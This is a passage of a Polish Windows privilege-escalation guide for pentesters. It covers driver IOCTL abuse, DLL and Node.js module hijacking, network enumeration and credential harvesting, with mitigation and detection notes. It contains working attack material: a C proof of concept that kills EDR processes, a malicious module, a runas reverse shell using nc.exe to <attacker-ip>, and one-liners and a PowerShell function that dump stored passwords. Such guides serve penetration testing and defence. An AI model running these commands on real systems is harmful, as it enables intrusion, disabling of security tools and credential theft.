- **Umieszczanie danych w zaufanych ulach**: użyj NtObjectManager do wyszukania zapisywalnych kluczy potomnych `\Registry\Machine`, a następnie ponownie uruchom skanowanie z duplikatem tokena o **niskim poziomie integralności**, aby znaleźć klucze dostępne z kontekstów sandboxowanych:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: bezpośredni zapis 8 bajtów do 4-bajtowego `int` uszkadza sąsiednie dane na stosie i może częściowo nadpisać pobliski wskaźnik callbacku/funkcji.
- **`REG_SZ` / `REG_EXPAND_SZ`**: tryb direct wymaga, aby `EntryContext` wskazywał na `UNICODE_STRING`. Jeśli kod najpierw wczyta kontrolowany przez atakującego `REG_DWORD` do skalarnej zmiennej na stosie, a następnie ponownie użyje tego samego bufora do odczytu ciągu znaków, atakujący kontroluje `Length`/`MaximumLength` i częściowo wpływa na wskaźnik `Buffer`, uzyskując półkontrolowany zapis do pamięci jądra.
- **`REG_BINARY`**: w przypadku dużych danych binarnych tryb direct traktuje pierwszy `LONG` pod adresem `EntryContext` jako rozmiar bufora ze znakiem. Jeśli wcześniejszy odczyt `REG_DWORD` pozostawi w ponownie użytej zmiennej kontrolowaną przez atakującego **ujemną** wartość, następne zapytanie `REG_BINARY` kopiuje bajty atakującego bezpośrednio do sąsiednich slotów na stosie. To często najprostsza droga do pełnego nadpisania wskaźnika callbacku.

Dobry wzorzec do wyszukiwania: **niejednorodne odczyty rejestru do tej samej zmiennej na stosie bez jej ponownej inicjalizacji**. Szukaj `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponownie używanych wskaźników `EntryContext` oraz ścieżek kodu, w których pierwszy odczyt rejestru decyduje o wykonaniu drugiego.

#### Wykorzystanie braku FILE_DEVICE_SECURE_OPEN na obiektach urządzeń (LPE + unieszkodliwienie EDR)

Niektóre podpisane sterowniki firm trzecich tworzą obiekt urządzenia z restrykcyjnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tej flagi bezpieczna lista DACL nie jest egzekwowana, gdy urządzenie jest otwierane przez ścieżkę zawierającą dodatkowy komponent. Dzięki temu każdy nieuprzywilejowany użytkownik może uzyskać uchwyt, używając ścieżki przestrzeni nazw takiej jak:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (z rzeczywistego przypadku)

Gdy użytkownik może już otworzyć urządzenie, może wykorzystać udostępnione przez sterownik uprzywilejowane IOCTL-e do eskalacji uprawnień (LPE) i manipulacji. Przykładowe możliwości zaobserwowane w praktyce:
- Zwracanie uchwytów z pełnym dostępem do dowolnych procesów (kradzież tokenu / powłoka SYSTEM za pomocą DuplicateTokenEx/CreateProcessAsUser).
- Nieograniczony odczyt/zapis surowych danych dysku (manipulacja offline, sztuczki z trwałością przy rozruchu).
- Kończenie dowolnych procesów, w tym Protected Process/Light (PP/PPL), co umożliwia unieszkodliwianie AV/EDR z poziomu użytkownika przez jądro.

Minimalny wzorzec PoC (tryb użytkownika):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Środki zaradcze dla developerów
- Zawsze ustawiaj FILE_DEVICE_SECURE_OPEN podczas tworzenia obiektów urządzeń, które mają być ograniczone przez DACL.
- Weryfikuj kontekst wywołującego przy operacjach uprzywilejowanych. Dodaj kontrole PP/PPL przed zezwoleniem na zakończenie procesu lub zwrócenie uchwytów.
- Ogranicz IOCTL (maski dostępu, METHOD_*, walidacja danych wejściowych) i rozważ modele brokerowane zamiast bezpośrednich uprawnień jądra.

Pomysły na wykrywanie dla zespołów obrony
- Monitoruj otwieranie z poziomu user-mode podejrzanych nazw urządzeń (np. \\ .\\amsdk*) oraz określonych sekwencji IOCTL wskazujących na nadużycie.
- Wymuszaj stosowanie listy blokowanych podatnych sterowników firmy Microsoft (HVCI/WDAC/Smart App Control) i utrzymuj własne listy dozwolonych/zablokowanych.


## PATH DLL Hijacking

Jeśli masz **uprawnienia zapisu w folderze znajdującym się w PATH**, możesz przejąć DLL ładowaną przez proces i **eskalować uprawnienia**.<sup>[[2]](#references)</sup>

Sprawdź uprawnienia do wszystkich folderów w PATH:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Więcej informacji o tym, jak nadużyć tej kontroli:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking rozwiązywania modułów Node.js / Electron przez `C:\node_modules`

Jest to wariant **niekontrolowanej ścieżki wyszukiwania w Windows**, który dotyczy aplikacji **Node.js** i **Electron**, gdy wykonują import bezpośredni, taki jak `require("foo")`, a oczekiwany moduł **nie istnieje**.<sup>[[20]](#references)</sup>

Node rozwiązuje pakiety, przechodząc w górę drzewa katalogów i sprawdzając foldery `node_modules` w każdym katalogu nadrzędnym. W Windows ta ścieżka może prowadzić aż do katalogu głównego dysku, więc aplikacja uruchomiona z `C:\Users\Administrator\project\app.js` może sprawdzać kolejno:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Jeśli **użytkownik z niskimi uprawnieniami** może utworzyć `C:\node_modules`, może umieścić tam złośliwy plik `foo.js` (lub folder pakietu) i poczekać, aż **proces Node/Electron o wyższych uprawnieniach** spróbuje rozwiązać brakującą zależność. Payload zostanie uruchomiony w kontekście bezpieczeństwa procesu ofiary, co prowadzi do **LPE**, gdy proces docelowy działa jako administrator, w ramach podwyższonego zadania zaplanowanego lub wrappera usługi albo jako automatycznie uruchamiana aplikacja desktopowa z podwyższonymi uprawnieniami.

Zdarza się to szczególnie często, gdy:

- zależność jest zadeklarowana w `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka innej firmy opakowuje `require("foo")` w `try/catch` i kontynuuje działanie po błędzie
- pakiet został usunięty z kompilacji produkcyjnych, pominięty podczas pakowania lub nie udało się go zainstalować
- podatne wywołanie `require()` znajduje się głęboko w drzewie zależności, a nie w kodzie głównej aplikacji

### Wyszukiwanie podatnych celów

Użyj **Procmon**, aby potwierdzić ścieżkę rozwiązywania:<sup>[[23]](#references)</sup>

- Ustaw filtr `Process Name` = plik wykonywalny celu (`node.exe`, plik EXE aplikacji Electron lub proces wrappera)
- Ustaw filtr `Path` `contains` `node_modules`
- Skup się na wynikach `NAME NOT FOUND` i ostatnim pomyślnym otwarciu w `C:\node_modules`

Przydatne wzorce podczas przeglądu kodu w rozpakowanych plikach `.asar` lub źródłach aplikacji:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Zidentyfikuj **brakującą nazwę pakietu** na podstawie Procmon lub analizy kodu źródłowego.
2. Utwórz katalog wyszukiwania root, jeśli jeszcze nie istnieje:

```powershell
mkdir C:\node_modules
```

3. Umieść moduł pod dokładnie oczekiwaną nazwą:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Uruchom aplikację ofiary. Jeśli aplikacja spróbuje wykonać `require("foo")`, a prawidłowego modułu brakuje, Node może załadować `C:\node_modules\foo.js`.

Rzeczywiste przykłady brakujących modułów opcjonalnych pasujących do tego wzorca to `bluebird` i `utf-8-validate`, ale **technika** jest uniwersalna: znajdź dowolny **brakujący import bezwzględny**, który uprzywilejowany proces Windows Node/Electron spróbuje rozwiązać.

### Wskazówki dotyczące wykrywania i zabezpieczania

- Wygeneruj alert, gdy użytkownik utworzy `C:\node_modules` lub zapisze tam nowe pliki/pakiety `.js`.
- Wyszukuj procesy o wysokim poziomie integralności odczytujące pliki z `C:\node_modules\*`.
- Dołączaj wszystkie zależności środowiska uruchomieniowego do wdrożeń produkcyjnych i kontroluj użycie `optionalDependencies`.
- Sprawdzaj kod firm trzecich pod kątem wzorców `try { require("...") } catch {}` ignorujących błędy.
- Wyłączaj opcjonalne sprawdzanie, jeśli biblioteka to umożliwia (na przykład niektóre wdrożenia `ws` mogą pominąć starsze sprawdzanie `utf-8-validate`, ustawiając `WS_NO_UTF_8_VALIDATE=1`).

## Sieć

### Udziały

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### plik hosts

Sprawdź, czy w pliku hosts są na sztywno wpisane inne znane komputery.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Interfejsy sieciowe i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otwarte porty

Sprawdź z zewnątrz, czy dostępne są **usługi objęte ograniczeniami**.

```bash
netstat -ano #Opened ports?
```

W przypadku lokalnego listenera powiąż jego PID z właścicielem procesu, ścieżką pliku wykonywalnego oraz usługą lub zaplanowanym zadaniem, które go uruchamia. Usługa zdalnego sterowania może zapewnić dostęp jako jej użytkownik pulpitu tylko wtedy, gdy pozwalają na to mechanizmy uwierzytelniania i kontroli poleceń. Niestandardowa aplikacja TCP działająca na koncie z wyższymi uprawnieniami to osobny cel analizy: listener i ścieżka pliku binarnego są jedynie pasywnymi wskazówkami, a ścieżka wykorzystująca błąd korupcji pamięci i wymagająca uwierzytelnienia wymaga analizy dokładnie tego pliku binarnego oraz dostępnych dla niego danych wejściowych. Jeśli wydaje się, że ujawniony port należy do procesu systemowego, porównaj go z wynikiem polecenia [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface), zanim przypiszesz go do usługi backendowej; sama reguła przekierowania nie dowodzi, że miejsce docelowe jest osiągalne ani podatne na atak.

### Tabela routingu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Tabela ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Reguły zapory

[**Sprawdź tę stronę, aby znaleźć polecenia związane z zaporą**](../basic-cmd-for-pentesters.md#firewall) **(wyświetlanie reguł, tworzenie reguł, wyłączanie, wyłączanie...)**

Więcej [poleceń do enumeracji sieci znajdziesz tutaj](../basic-cmd-for-pentesters.md#network)

### Podsystem Windows dla systemu Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Plik binarny `bash.exe` można również znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz uprawnienia użytkownika root, możesz nasłuchiwać na dowolnym porcie (przy pierwszym użyciu `nc.exe` do nasłuchiwania na porcie pojawi się graficzne pytanie, czy zapora powinna zezwolić na używanie `nc`).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Aby łatwo uruchomić bash jako root, możesz użyć `--default-user root`

Możesz przeglądać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Uprawnienia Linux `root` w WSL same w sobie nie nadają praw Administratora w Windows. Jeśli bieżąca tożsamość Windows może odczytać system plików dystrybucji, sprawdź pliki historii powłoki (w tym `/root/.bash_history`) pod kątem poleceń, które mogły zapisać dane uwierzytelniające. Eskalacja uprawnień nadal wymaga prawidłowego konta o wyższych uprawnieniach i dozwolonej metody uwierzytelniania. Układ `LocalState\rootfs` dotyczy starszych instalacji WSL; WSL 2 zwykle przechowuje dystrybucję na [wirtualnym dysku `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), dlatego najpierw ustal faktyczną dystrybucję i ścieżkę przechowywania. Unikaj wyświetlania zawartości historii podczas automatycznego enumerowania.

## Poświadczenia Windows

### Poświadczenia Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Traktuj `DefaultUserName` i `DefaultDomainName` jako kontekst konta, a nie poświadczenia. Niepusta wartość `DefaultPassword` lub `AltDefaultPassword` oznacza, że w rejestrze znaleziono hasło zapisane jawnym tekstem. Jeśli `AutoAdminLogon=1`, ale nie można odczytać hasła zapisanego jawnym tekstem, jest to tylko wskazówka: [Sysinternals Autologon może przechowywać hasło jako sekret LSA](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a zwykły odczyt rejestru nie pozwala ustalić, czy taki sekret istnieje ani czy można go odzyskać. Przed zgłoszeniem narażenia poświadczeń sprawdź prawa dostępu i faktyczną konfigurację logowania.

### Menedżer poświadczeń / Windows Vault

Z [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault przechowuje poświadczenia użytkowników do serwerów, witryn internetowych i innych programów, których **Windows** może używać do **automatycznego logowania użytkowników**. Na pierwszy rzut oka może się wydawać, że użytkownicy mogą przechowywać poświadczenia do witryn takich jak Facebook, Twitter lub Gmail, a przeglądarki będą logować się automatycznie, ale tak to nie działa.

Windows Vault przechowuje poświadczenia, których Windows może używać do automatycznego logowania użytkowników. Oznacza to, że każda **aplikacja systemu Windows, która potrzebuje poświadczeń, aby uzyskać dostęp do zasobu** (serwera lub witryny internetowej), **może korzystać z tego Menedżera poświadczeń** i Windows Vault, używając zapisanych poświadczeń zamiast wymagać od użytkowników każdorazowego podawania nazwy użytkownika i hasła.

Jeśli aplikacje nie współpracują z Menedżerem poświadczeń, nie sądzę, by mogły używać poświadczeń do danego zasobu. Jeśli więc aplikacja ma korzystać z vaulta, powinna w jakiś sposób **komunikować się z Menedżerem poświadczeń i pobierać poświadczenia dotyczące tego zasobu** z domyślnego vaulta magazynu.

Użyj `cmdkey`, aby wyświetlić listę zapisanych poświadczeń na komputerze.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Następnie możesz użyć `runas` z opcją `/savecred`, aby użyć zapisanych poświadczeń. Poniższy przykład uruchamia zdalny plik binarny za pośrednictwem udziału SMB.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Używanie `runas` z podanymi poświadczeniami.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Zwróć uwagę na mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) lub moduł [Empire Powershells](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Nowoczesne aplikacje Windows UWP, Microsoft Edge i nowoczesne usługi systemowe przechowują tokeny uwierzytelniające i hasła w postaci jawnego tekstu w `PasswordVault` platformy Universal Windows Platform (UWP) (dostępnym również jako `Web Credentials` w `vaultcmd`). Ta przestrzeń przechowywania jest odizolowana dla każdej sesji i można ją odszyfrować natywnie bez uprawnień administratora ani `SeDebugPrivilege`.

Wykonaj to polecenie PowerShell w aktywnej sesji użytkownika, aby natychmiast zrzucić i odszyfrować wszystkie zapisane nazwy użytkowników oraz hasła w postaci jawnego tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** udostępnia metodę symetrycznego szyfrowania danych, wykorzystywaną głównie w systemie operacyjnym Windows do symetrycznego szyfrowania asymetrycznych kluczy prywatnych. Szyfrowanie to wykorzystuje sekret użytkownika lub systemu, który w istotnym stopniu zwiększa entropię.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego wyprowadzanego z sekretów logowania użytkownika**. W przypadku szyfrowania systemowego wykorzystuje sekrety uwierzytelniania domenowego systemu.

Zaszyfrowane klucze RSA użytkowników, chronione przez DPAPI, są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie `{SID}` oznacza [identyfikator zabezpieczeń](https://en.wikipedia.org/wiki/Security_Identifier) użytkownika. **Klucz DPAPI, znajdujący się w tym samym pliku co klucz główny chroniący klucze prywatne użytkownika**, składa się zwykle z 64 bajtów losowych danych. (Należy pamiętać, że dostęp do tego katalogu jest ograniczony, dlatego nie można wyświetlić jego zawartości za pomocą polecenia `dir` w CMD, ale można to zrobić w PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Możesz użyć **modułu mimikatz** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby go odszyfrować.

**Pliki poświadczeń chronione hasłem głównym** zwykle znajdują się w:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Możesz użyć **modułu mimikatz** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować dane.\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane w **skryptach** i zadaniach automatyzacji jako wygodny sposób przechowywania zaszyfrowanych danych logowania. Są one chronione przez **DPAPI**, co zazwyczaj oznacza, że można je odszyfrować tylko na tym samym komputerze i przez tego samego użytkownika, który je utworzył.

Wyeksportowane poświadczenie może mieć dowolną nazwę pliku lub ścieżkę `.xml`. Gdy skrypt lub inwentaryzacja plików wskaże taki plik, ustal rzeczywisty katalog profilu konta zamiast zakładać, że znajduje się on w `C:\Users`: [Windows może przechowywać profile w innych lokalizacjach](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Możliwość odczytania pliku jest tylko wskazówką; [funkcja Windows `Export-Clixml` wiąże zaszyfrowane poświadczenie z użytkownikiem i komputerem, na których zostało wyeksportowane](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a każde odzyskane konto musi mieć osobno odpowiednie uprawnienia do docelowej usługi. Najpierw sprawdź ścieżki i listy ACL, nie wyświetlając zaszyfrowanych ani jawnych wartości podczas rutynowego rozpoznania.

Aby **odszyfrować** poświadczenia PS z pliku, który je zawiera, możesz wykonać:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Zapisane połączenia RDP

Można je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
oraz w `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Ostatnio uruchamiane polecenia

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menedżer poświadczeń Pulpitu zdalnego**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Użyj modułu **Mimikatz** `dpapi::rdg` z odpowiednim `/masterkey`, aby **odszyfrować wszystkie pliki .rdg**\
Możesz **wyodrębnić wiele kluczy głównych DPAPI** z pamięci za pomocą modułu Mimikatz `sekurlsa::dpapi`

**mRemoteNG używa innego magazynu połączeń.** Sprawdź czytelne pliki XML w `%APPDATA%\mRemoteNG` i folderze Dokumenty użytkownika, w tym pliki o zwyczajnych nazwach, takie jak `config.xml`. Ustal schemat połączeń i zaszyfrowane atrybuty `Password`, zanim uznasz plik XML za potencjalne źródło danych uwierzytelniających. Zapisana wartość nie jest hasłem DPAPI/RDCMan; jej odzyskanie zależy od ustawień szyfrowania pliku oraz od tego, czy użyto niestandardowego hasła głównego. Podczas szerokiego wyszukiwania unikaj wyświetlania zaszyfrowanych wartości.

**Eksporty profili Remote Desktop Plus** mogą być również czytelne w katalogach użytkowników lub współdzielonym folderze administracyjnym. Eksport `profiles.xml` ze starszej wersji zawiera wpisy `Data/Profile` z elementami `ProfileName`, `Password` i `Secure`. Potraktuj niepusty element hasła jako potencjalne źródło danych uwierzytelniających, ale go nie wyświetlaj ani nie zakładaj, że zawiera tekst jawny: [informacje dostawcy](https://www.donkz.nl/) wskazują, że ochrona profilu może być powiązana z kontem i komputerem, na których go utworzono, albo skonfigurowana mniej restrykcyjnie. Zanim na nim polegasz, ustal pochodzenie pliku i warunki odzyskania danych.

### Sticky Notes

Użytkownicy często używają aplikacji StickyNotes na stacjach roboczych z Windows, aby **zapisywać hasła** i inne informacje, nie zdając sobie sprawy, że jest to plik bazy danych. Ten plik znajduje się pod ścieżką `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i zawsze warto go wyszukać oraz sprawdzić.

Użytkownicy czasem zapisują hasła i inne informacje w aplikacjach z karteczkami samoprzylepnymi. Aplikacja Sticky Notes dołączana do Microsoftu zwykle przechowuje notatki pod ścieżką `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starsze lub inne aplikacje mogą używać innych lokalizacji w profilu użytkownika, w tym LevelDB. Zanim uznasz brak pliku SQLite za brak notatek, ustal, jaka aplikacja jest zainstalowana i jakiego formatu pamięci używa.

Jeśli Sticky Notes korzysta z dziennika WAL SQLite, sama kopia pliku `plum.sqlite` może nie zawierać ostatnich zatwierdzonych notatek. Zachowaj powiązany plik `plum.sqlite-wal` wraz ze spójną kopią bazy danych, a jeśli jest dostępny, dołącz również `plum.sqlite-shm`; indeks w pamięci współdzielonej można odbudować, ale plik WAL jest częścią trwałego stanu bazy danych. Zobacz [dokumentację WAL SQLite](https://www.sqlite.org/wal.html). Notatka zawierająca nazwę konta lub hasło jest jedynie potencjalnym źródłem danych uwierzytelniających: osobno zweryfikuj konto, dozwolony dostęp i ponowne użycie hasła. Zaszyfrowany wpis menedżera haseł wymaga ponadto właściwego klucza deszyfrującego i interpretacji specyficznej dla aplikacji, zanim będzie można uznać go za podstawę do logowania na konto o wyższych uprawnieniach.

### AppCmd.exe

**Pamiętaj, że do odzyskania haseł z AppCmd.exe musisz mieć uprawnienia Administratora i uruchomić go z wysokim poziomem integralności.**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\
Jeśli ten plik istnieje, możliwe, że skonfigurowano pewne **dane uwierzytelniające**, które można **odzyskać**.

Ten kod pochodzi z [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Sprawdź, czy istnieje `C:\Windows\CCM\SCClient.exe` .\
Instalatory są **uruchamiane z uprawnieniami SYSTEM**, wiele z nich jest podatnych na **DLL Sideloading (Informacje z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Pliki i rejestr (poświadczenia)

### Artefakty poświadczeń narzędzi wsparcia w rejestrze

Niektóre starsze instalacje zdalnego wsparcia zachowują nazwy wartości związane z hasłami pod stałymi kluczami rejestru aplikacji. Na przykład `SecurityPasswordAES` w TeamViewerze wskazywało skonfigurowane statyczne hasło sesji w wersjach wcześniejszych niż 9, zgodnie z [wyjaśnieniem dostawcy dotyczącym klucza rejestru](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Znacznik w nazwie wartości to jedynie wskazówka do weryfikacji: przed oceną tych poświadczeń sprawdź zainstalowaną wersję, możliwość odczytu danych wartości, format oraz bieżące działanie uwierzytelniania. Przejście od hasła zdalnego wsparcia do bardziej uprzywilejowanego konta Windows wymaga ponadto rzeczywistego ponownego użycia hasła oraz uprawnień do tego konta. Nie umieszczaj szyfrogramu ani odzyskanych haseł w standardowych wynikach enumeracji.

### Udostępnione arkusze z chronionymi arkuszami

